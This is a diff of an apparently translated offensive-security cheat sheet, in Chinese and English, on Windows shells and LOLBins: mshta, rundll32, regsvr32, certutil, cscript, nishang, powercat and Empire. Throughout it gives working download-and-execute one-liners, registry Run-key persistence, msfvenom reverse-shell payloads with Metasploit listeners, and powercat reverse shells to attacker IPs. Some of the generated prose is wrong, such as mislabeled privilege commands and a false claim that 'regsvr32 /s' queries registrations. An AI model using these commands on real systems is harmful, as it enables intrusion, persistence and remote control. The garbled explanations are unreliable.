-使用Mshta，可以使用VBScript和JavaScript执行目录创建。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").CreateFolder "C:\path\to\new_folder"
-```
-
-### 20. 使用VBScript和JavaScript执行目录删除
-
-使用Mshta，可以使用VBScript和JavaScript执行目录删除。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("Scripting.FileSystemObject").DeleteFolder "C:\path\to\folder"
-```
-
-### 21. 使用VBScript和JavaScript执行注册表项创建
-
-使用Mshta，可以使用VBScript和JavaScript执行注册表项创建。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp", "C:\path\to\malicious.exe", "REG_SZ"
-```
-
-### 22. 使用VBScript和JavaScript执行注册表项删除
-
-使用Mshta，可以使用VBScript和JavaScript执行注册表项删除。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp"
-```
-
-### 23. 使用VBScript和JavaScript执行服务创建
-
-使用Mshta，可以使用VBScript和JavaScript执行服务创建。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc create MyService binPath= ""C:\path\to\malicious.exe"" start= auto"
-```
-
-### 24. 使用VBScript和JavaScript执行服务删除
-
-使用Mshta，可以使用VBScript和JavaScript执行服务删除。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc delete MyService"
-```
-
-### 25. 使用VBScript和JavaScript执行服务启动
-
-使用Mshta，可以使用VBScript和JavaScript执行服务启动。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc start MyService"
-```
-
-### 26. 使用VBScript和JavaScript执行服务停止
-
-使用Mshta，可以使用VBScript和JavaScript执行服务停止。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc stop MyService"
-```
-
-### 27. 使用VBScript和JavaScript执行服务重启
-
-使用Mshta，可以使用VBScript和JavaScript执行服务重启。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc stop MyService && sc start MyService"
-```
-
-### 28. 使用VBScript和JavaScript执行服务禁用
-
-使用Mshta，可以使用VBScript和JavaScript执行服务禁用。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService start= disabled"
-```
-
-### 29. 使用VBScript和JavaScript执行服务启用
-
-使用Mshta，可以使用VBScript和JavaScript执行服务启用。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService start= auto"
-```
-
-### 30. 使用VBScript和JavaScript执行服务查询
-
-使用Mshta，可以使用VBScript和JavaScript执行服务查询。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc query MyService"
-```
-
-### 31. 使用VBScript和JavaScript执行服务修改
-
-使用Mshta，可以使用VBScript和JavaScript执行服务修改。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService binPath= ""C:\path\to\malicious.exe"""
-```
-
-### 32. 使用VBScript和JavaScript执行服务权限提升
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""LocalSystem"""
-```
-
-### 33. 使用VBScript和JavaScript执行服务权限降低
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""LocalService"""
-```
-
-### 34. 使用VBScript和JavaScript执行服务权限提权
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提权。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\SYSTEM"""
-```
-
-### 35. 使用VBScript和JavaScript执行服务权限降权
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降权。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\NETWORK SERVICE"""
-```
-
-### 36. 使用VBScript和JavaScript执行服务权限提升到管理员
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到管理员。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""BUILTIN\Administrators"""
-```
-
-### 37. 使用VBScript和JavaScript执行服务权限降低到用户
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到用户。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""BUILTIN\Users"""
-```
-
-### 38. 使用VBScript和JavaScript执行服务权限提升到域管理员
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到域管理员。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""DOMAIN\Administrator"""
-```
-
-### 39. 使用VBScript和JavaScript执行服务权限降低到域用户
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到域用户。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""DOMAIN\User"""
-```
-
-### 40. 使用VBScript和JavaScript执行服务权限提升到本地管理员
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到本地管理员。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= "".\Administrator"""
-```
-
-### 41. 使用VBScript和JavaScript执行服务权限降低到本地用户
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到本地用户。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= "".\User"""
-```
-
-### 42. 使用VBScript和JavaScript执行服务权限提升到系统
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到系统。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\SYSTEM"""
-```
-
-### 43. 使用VBScript和JavaScript执行服务权限降低到网络服务
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到网络服务。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c sc config MyService obj= ""NT AUTHORITY\NETWORK SERVICE"""
-```
-
-### 44. 使用VBScript和JavaScript执行服务权限提升到管理员组
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到管理员组。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net localgroup Administrators MyUser /add"
-```
-
-### 45. 使用VBScript和JavaScript执行服务权限降低到用户组
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到用户组。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net localgroup Users MyUser /add"
-```
-
-### 46. 使用VBScript和JavaScript执行服务权限提升到域管理员组
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限提升到域管理员组。以下是一个示例：
-
-```powershell
-mshta vbscript:CreateObject("WScript.Shell").Run "cmd.exe /c net group ""Domain Admins"" MyUser /add /domain"
-```
-
-### 47. 使用VBScript和JavaScript执行服务权限降低到域用户组
-
-使用Mshta，可以使用VBScript和JavaScript执行服务权限降低到域用户组。以下是
+请参阅本文档末尾的附录，了解有关不同Powershell Shell的更多信息。
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -733,6 +328,26 @@ new ActiveXObject('WScript.Shell').Run(c);
 #### **mshta - sct**
 
 #### **mshta - sct**
+
+The `mshta - sct` technique is a method of executing malicious code on a Windows system using the `mshta` utility and a scriptlet file (`sct`). This technique leverages the `mshta` utility, which is a legitimate Windows component used to execute HTML applications (`hta` files). By combining `mshta` with a scriptlet file, an attacker can execute arbitrary code on a target system.
+
+To use this technique, an attacker typically creates a scriptlet file (`sct`) that contains the malicious code they want to execute. The scriptlet file can be hosted on a remote server or delivered to the target system through other means, such as email attachments or malicious downloads. The attacker then uses the `mshta` utility to execute the scriptlet file, which in turn executes the malicious code.
+
+The `mshta - sct` technique can be used to bypass security measures that may block or detect other types of malicious files, such as executable files (`exe`) or script files (`vbs`, `bat`). Since `mshta` is a legitimate Windows component, it is less likely to be blocked or flagged by security software.
+
+To execute a scriptlet file using `mshta`, the following command can be used:
+
+```
+mshta.exe <URL to scriptlet file>
+```
+
+The `mshta` utility will download and execute the scriptlet file, which can contain any type of code, including JavaScript, VBScript, or PowerShell. This allows an attacker to perform a wide range of malicious activities, such as downloading and executing additional malware, stealing sensitive information, or gaining unauthorized access to the system.
+
+It is important to note that the `mshta - sct` technique relies on social engineering to trick users into executing the malicious scriptlet file. Attackers may use various tactics, such as disguising the file as a legitimate document or enticing users to click on a malicious link.
+
+To protect against this technique, users should exercise caution when opening email attachments or clicking on links, especially if they come from unknown or suspicious sources. Additionally, organizations should implement security measures, such as email filtering and endpoint protection, to detect and block malicious files and URLs.
+
+Overall, the `mshta - sct` technique is a powerful method for executing malicious code on a Windows system, bypassing traditional security measures. By understanding how this technique works, users and organizations can better protect themselves against such attacks.
 ```markup
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -752,27 +367,27 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 #### **Mshta - Metasploit**
 
-Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component, but it can also be used by attackers to execute malicious code.
+Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows. It is a legitimate Windows component that can be abused by attackers to execute malicious code.
 
 Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that allows you to exploit the Mshta vulnerability.
 
-To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port number of the Metasploit listener, while the `URIPATH` option specifies the path of the HTML application.
+To use this module, you need to set the `SRVHOST`, `SRVPORT`, and `URIPATH` options. The `SRVHOST` and `SRVPORT` options specify the IP address and port number of the Metasploit server, while the `URIPATH` option specifies the path of the malicious HTA file.
 
-Once the options are set, you can run the exploit by executing the `exploit` command. This will start the Metasploit listener and serve the malicious HTML application. When the target opens the HTML application, the payload will be executed on their system.
+Once the options are set, you can run the exploit by executing the `exploit` command. This will start the Metasploit server and serve the malicious HTA file. When the target user opens the HTA file, the payload will be executed on their system.
 
-It is important to note that the Mshta vulnerability is a client-side vulnerability, meaning that it relies on the target opening the malicious HTML application. Therefore, social engineering techniques may be necessary to convince the target to open the application.
+It is important to note that using this module requires the target user to have Internet Explorer installed and the "mshta.exe" file associated with the ".hta" file extension.
 
 #### **Mshta - Metasploit**
 
-Mshta是Microsoft HTML应用程序宿主，允许您在Windows系统上执行HTML应用程序（.hta文件）。它是一个合法的Windows组件，但攻击者也可以使用它来执行恶意代码。
+Mshta是Microsoft HTML应用程序宿主，允许您在Windows上执行HTML应用程序（.hta文件）。它是一个合法的Windows组件，攻击者可以滥用它来执行恶意代码。
 
 Metasploit是一个流行的渗透测试框架，提供了一个名为`exploit/windows/browser/mshta`的模块，允许您利用Mshta漏洞。
 
-要使用此模块，您需要设置`SRVHOST`、`SRVPORT`和`URIPATH`选项。`SRVHOST`和`SRVPORT`选项指定Metasploit侦听器的IP地址和端口号，而`URIPATH`选项指定HTML应用程序的路径。
+要使用此模块，您需要设置`SRVHOST`，`SRVPORT`和`URIPATH`选项。`SRVHOST`和`SRVPORT`选项指定Metasploit服务器的IP地址和端口号，而`URIPATH`选项指定恶意HTA文件的路径。
 
-设置选项后，可以通过执行`exploit`命令来运行利用程序。这将启动Metasploit侦听器并提供恶意HTML应用程序。当目标打开HTML应用程序时，负载将在其系统上执行。
+设置选项后，可以通过执行`exploit`命令来运行利用程序。这将启动Metasploit服务器并提供恶意HTA文件。当目标用户打开HTA文件时，负载将在其系统上执行。
 
-需要注意的是，Mshta漏洞是一种客户端漏洞，意味着它依赖于目标打开恶意HTML应用程序。因此，可能需要使用社交工程技术来说服目标打开应用程序。
+需要注意的是，使用此模块需要目标用户安装Internet Explorer，并将"mshta.exe"文件与".hta"文件扩展名关联起来。
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -820,23 +435,43 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 #### **Rundll32 - Metasploit**
 
-Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. It can be used to load and execute malicious DLLs, making it a useful tool for post-exploitation activities.
-
-Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages Rundll32 to execute arbitrary DLLs on a target system.
+Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages Rundll32 to execute malicious DLLs on a target system.
 
 To use this module, follow these steps:
 
-1. Start Metasploit by running the `msfconsole` command.
-2. Search for the `windows/local/execute` module using the `search` command.
-3. Load the module using the `use` command followed by the module path.
-4. Set the required options using the `set` command. These options include the `DLL` parameter, which specifies the path to the DLL to be executed, and the `PROC` parameter, which specifies the function to be executed within the DLL.
-5. Run the module using the `run` command.
+1. Generate a malicious DLL payload using the `msfvenom` tool. For example, to create a reverse shell payload:
 
-Once the module is executed, the specified DLL will be loaded and the specified function will be executed on the target system.
+   ```
+   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
+   ```
 
-It is important to note that the DLL being executed should be compatible with the target system architecture (32-bit or 64-bit). Additionally, the DLL should be carefully crafted to avoid detection by antivirus software.
+   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.
 
-Using Rundll32 with Metasploit can be an effective way to maintain persistence on a compromised system and perform various post-exploitation tasks. However, it is crucial to use this technique responsibly and only in authorized penetration testing scenarios.
+2. Start a Metasploit listener to receive the reverse shell connection:
+
+   ```
+   use exploit/multi/handler
+   set payload windows/shell_reverse_tcp
+   set LHOST <attacker IP>
+   set LPORT <attacker port>
+   exploit
+   ```
+
+   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.
+
+3. Upload the generated `payload.dll` to the target system.
+
+4. Use the `rundll32` command to execute the malicious DLL:
+
+   ```
+   rundll32 payload.dll, <function name>
+   ```
+
+   Replace `<function name>` with the name of the exported function in the DLL.
+
+   The target system will establish a reverse shell connection to the attacker's machine, providing the attacker with remote access and control over the target system.
+
+Note: This technique may trigger antivirus alerts, so it is important to use it responsibly and only in controlled environments.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -844,13 +479,21 @@ run
 ```
 **Rundll32 - Koadic**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.
+Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that leverages the Rundll32 utility to load malicious DLLs and execute commands on a compromised system.
 
-Koadic is a post-exploitation RAT (Remote Access Tool) that provides a command-and-control interface to interact with compromised systems. It uses Rundll32 to load a malicious DLL, which then establishes a connection with the attacker's command-and-control server.
+To use Koadic, first, you need to generate a malicious DLL payload using the Koadic framework. This payload can be customized to perform various actions, such as establishing a reverse shell or executing arbitrary commands.
 
-To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using Rundll32, which executes the code within the DLL. Once the connection is established, the attacker can remotely control the compromised system, execute commands, and exfiltrate data.
+Once the payload is generated, you can use the Rundll32 utility to load the DLL and execute the desired commands. The syntax for executing a DLL using Rundll32 is as follows:
 
-It's important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to help defenders protect their systems against such attacks.
+```
+rundll32.exe <path_to_malicious_dll>,<entry_point>
+```
+
+The `<path_to_malicious_dll>` should be the path to the generated DLL payload, and `<entry_point>` should be the name of the exported function within the DLL that you want to execute.
+
+By leveraging Rundll32 and Koadic, an attacker can execute commands on a compromised system without the need for a separate executable. This technique can be useful for maintaining persistence, evading detection, and performing various post-exploitation activities.
+
+It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security vulnerabilities and to promote responsible and ethical hacking practices.
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -861,14 +504,51 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-Regsvr32是Windows操作系统中的一个命令行实用程序，用于注册和注销动态链接库（DLL）文件。它可以用于执行各种操作，包括加载DLL文件、注册COM组件和解除注册。以下是一些常用的Regsvr32命令：
+Regsvr32是Windows操作系统中的一个命令行实用程序，用于注册和注销动态链接库（DLL）文件。它可以用于执行各种操作，包括注册DLL文件、注销DLL文件、查看已注册的DLL文件等。
 
-- `regsvr32 /s <DLL文件路径>`：静默注册DLL文件。
-- `regsvr32 /u /s <DLL文件路径>`：静默解除注册DLL文件。
-- `regsvr32 /i /s <DLL文件路径>`：静默安装DLL文件。
-- `regsvr32 /n /i:<InstallCommand> /s <DLL文件路径>`：使用自定义安装命令静默安装DLL文件。
+### 注册DLL文件
 
-请注意，Regsvr32命令需要以管理员权限运行。
+要注册DLL文件，可以使用以下命令：
+
+```shell
+regsvr32 <DLL文件路径>
+```
+
+例如，要注册名为example.dll的DLL文件，可以使用以下命令：
+
+```shell
+regsvr32 C:\path\to\example.dll
+```
+
+### 注销DLL文件
+
+要注销已注册的DLL文件，可以使用以下命令：
+
+```shell
+regsvr32 /u <DLL文件路径>
+```
+
+例如，要注销名为example.dll的DLL文件，可以使用以下命令：
+
+```shell
+regsvr32 /u C:\path\to\example.dll
+```
+
+### 查看已注册的DLL文件
+
+要查看已注册的DLL文件，可以使用以下命令：
+
+```shell
+regsvr32 /s <DLL文件路径>
+```
+
+例如，要查看名为example.dll的DLL文件是否已注册，可以使用以下命令：
+
+```shell
+regsvr32 /s C:\path\to\example.dll
+```
+
+以上是使用Regsvr32命令行实用程序在Windows操作系统中注册、注销和查看DLL文件的方法。
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -903,19 +583,30 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 #### **Regsvr32 - Metasploit**
 
-Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. Metasploit provides a module called `regsvr32_command_delivery` that allows you to use Regsvr32 to execute a payload on a target system.
+Regsvr32 is a Windows command-line utility used to register and unregister DLLs (Dynamic Link Libraries) and ActiveX controls in the Windows Registry. This utility can also be used to execute arbitrary code on a target system.
 
-To use this module, follow these steps:
+Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It can be used to exploit vulnerabilities in various systems and gain unauthorized access.
 
-1. Start Metasploit by running `msfconsole` in your terminal.
-2. Search for the `regsvr32_command_delivery` module by typing `search regsvr32_command_delivery`.
-3. Load the module by typing `use exploit/windows/local/regsvr32_command_delivery`.
-4. Set the required options, such as `SESSION` (the session to run the payload on) and `CMD` (the command to execute).
-5. Run the exploit by typing `exploit`.
+By combining the functionality of Regsvr32 with the capabilities of Metasploit, an attacker can register a malicious DLL or ActiveX control on a target system and execute arbitrary code with the privileges of the user running the Regsvr32 command.
 
-The payload will be executed on the target system using Regsvr32, allowing you to gain remote access or perform other actions on the compromised system.
+To use Regsvr32 with Metasploit, follow these steps:
 
-Note: This technique may trigger antivirus alerts, so it is important to use it responsibly and in controlled environments.
+1. Generate a malicious DLL or ActiveX control using Metasploit's payload generator.
+2. Transfer the generated payload to the target system.
+3. Open a command prompt on the target system.
+4. Use the following command to register the malicious DLL or ActiveX control:
+
+```
+regsvr32 /s /n /u /i:http://<attacker_ip>:<attacker_port>/payload.sct scrobj.dll
+```
+
+Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port of the system running the Metasploit listener.
+
+5. Once the DLL or ActiveX control is registered, it will be executed automatically when certain conditions are met (e.g., opening a specific file type or visiting a website).
+
+This technique can be used to gain remote access to a target system and perform various malicious activities, such as stealing sensitive information, installing backdoors, or launching further attacks.
+
+It is important to note that using this technique without proper authorization is illegal and unethical. It should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -924,7 +615,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**您可以使用stager regsvr非常容易地下载并执行Koadic僵尸**
+**您可以使用stager regsvr轻松下载并执行Koadic僵尸**
 
 ## Certutil
 
@@ -938,22 +629,13 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **被防御者检测到**
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof是所有加密漏洞赏金的家园。**
+查找最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-**即时获得奖励**\
-HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。
+{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}
 
-**在web3渗透测试中积累经验**\
-区块链协议和智能合约是新的互联网！在其兴起之时掌握web3安全。
-
-**成为web3黑客传奇**\
-每次验证的漏洞都会获得声望积分，并登上每周排行榜的榜首。
-
-[**在HackenProof上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中赚取收益！
-
-{% embed url="https://hackenproof.com/register" %}
+***
 
 ## **Cscript/Wscript**
 ```bash
@@ -961,35 +643,31 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```
 **Cscript - Metasploit**
 
-Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.
+Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.
 
-In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious VBScript or JScript payload and executing it using Cscript, an attacker can gain remote access to a compromised Windows system.
+Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals for testing the security of computer systems.
 
-To use Cscript with Metasploit, follow these steps:
+When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript payloads on a target Windows machine.
 
-1. Generate a malicious VBScript or JScript payload using the `msfvenom` command in Metasploit. For example, to generate a reverse shell payload:
+To use Cscript with Metasploit, you can create a payload using the `msfvenom` tool and specify the output format as `vbs` or `js`. This will generate a script that can be executed using Cscript.
 
-   ```
-   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f vbs -o payload.vbs
-   ```
+Here's an example of generating a VBScript payload using `msfvenom`:
 
-   Replace `<attacker IP>` and `<attacker port>` with your own IP address and port.
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f vbs > payload.vbs
+```
 
-2. Transfer the generated payload (`payload.vbs`) to the target Windows system. This can be done using various methods, such as email, file sharing, or exploiting vulnerabilities in other software.
+Once you have the payload script, you can transfer it to the target Windows machine and execute it using Cscript. This can be done using various methods, such as social engineering, exploiting vulnerabilities, or using other techniques.
 
-3. On the target Windows system, open a command prompt and navigate to the directory where the payload is located.
+To execute the payload using Cscript, open a command prompt on the target machine and run the following command:
 
-4. Execute the payload using Cscript:
+```
+cscript payload.vbs
+```
 
-   ```
-   cscript payload.vbs
-   ```
+This will execute the payload and establish a connection back to your machine, allowing you to gain remote access and control over the target system.
 
-   This will run the payload and establish a reverse shell connection to the attacker's machine.
-
-It is important to note that using Cscript as a payload delivery method may trigger antivirus or security software detections. To bypass these detections, techniques such as obfuscation or encryption can be used to make the payload more difficult to detect.
-
-By leveraging the power of Cscript and Metasploit, an attacker can exploit vulnerabilities in Windows systems and gain unauthorized access for further malicious activities.
+It's important to note that using Cscript with Metasploit requires proper authorization and should only be performed on systems you have permission to test. Unauthorized use of these techniques can lead to legal consequences. Always ensure you follow ethical hacking guidelines and obtain proper consent before conducting any penetration testing activities.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
@@ -1101,7 +779,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-在**Shells**文件夹中，有很多不同的反弹Shell。要下载并执行Invoke-_PowerShellTcp.ps1_，请复制该脚本并将其附加到文件末尾：
+在**Shells**文件夹中，有许多不同的反弹Shell。要下载并执行Invoke-_PowerShellTcp.ps1_，请复制该脚本并将其附加到文件末尾：
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -1111,13 +789,13 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender目前尚未将其检测为恶意代码（截至2019年3月4日）。
 
-**TODO: 检查其他nishang shells**
+**TODO：检查其他nishang shells**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-下载，启动一个Web服务器，启动监听器，并在受害者端执行它：
+下载，启动Web服务器，启动监听器，并在受害者端执行：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -1146,7 +824,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-创建一个PowerShell启动器，将其保存在一个文件中，然后下载并执行它。
+创建一个PowerShell启动器，将其保存在文件中，然后下载并执行它。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -1175,7 +853,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 [PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些具有攻击性的PS模块的PS控制台（加密）\
 [WinPWN](https://github.com/SecureThisShit/WinPwn) 预加载了一些具有攻击性的PS模块和代理检测的PS控制台（IEX）
 
-## 参考文献
+## 参考资料
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -1186,31 +864,21 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof 是所有加密货币漏洞赏金的家园。**
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-**即时获得奖励**\
-HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
-**在 web3 渗透测试中积累经验**\
-区块链协议和智能合约是新的互联网！在其兴起之时掌握 web3 安全。
-
-**成为 web3 黑客传奇**\
-每次验证的漏洞都会获得声望积分，并登上每周排行榜的榜首。
-
-[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中获利！
-
-{% embed url="https://hackenproof.com/register" %}
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 您在**网络安全公司**工作吗？您想在 HackTricks 中看到您的公司广告吗？或者您想获得最新版本的 PEASS 或下载 PDF 格式的 HackTricks 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
